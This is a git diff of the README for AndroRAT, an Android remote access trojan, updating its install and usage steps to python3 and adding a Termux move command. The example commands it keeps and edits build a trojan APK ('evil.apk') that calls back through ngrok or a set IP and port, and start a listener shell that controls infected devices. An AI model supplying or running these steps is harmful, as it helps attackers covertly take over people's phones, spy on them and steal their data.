@@ -33,9 +33,12 @@ AndroRAT requires Python (3.6-3.8) and JAVA 8 (or Android Studio)
 ```
 
 git clone https://github.com/FullPenetrationTesting/AndroRAT
+
 ./install.sh
 
-pip install -r requirements.txt
+mv /data/data/com.termux/files/home/AndroRAat -t /data/data/com.termux/files/home/ubuntu-in-termux/ubuntu-fs/root
+
+pip3 install -r requirements.txt
 ```
 #### Note: 
 While cloning the repository using Git bash on windows, you may get the following error:
@@ -121,13 +124,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python androRAT.py --build --ngrok -o evil.apk```
+```python3 androRAT.py --build --ngrok -o evil.apk```
 
 * To build the apk using desired ip and port:
-```python androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
 
 * To get the interpreter:
-```python androRAT.py --shell -i 0.0.0.0 -p 8000```
+```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
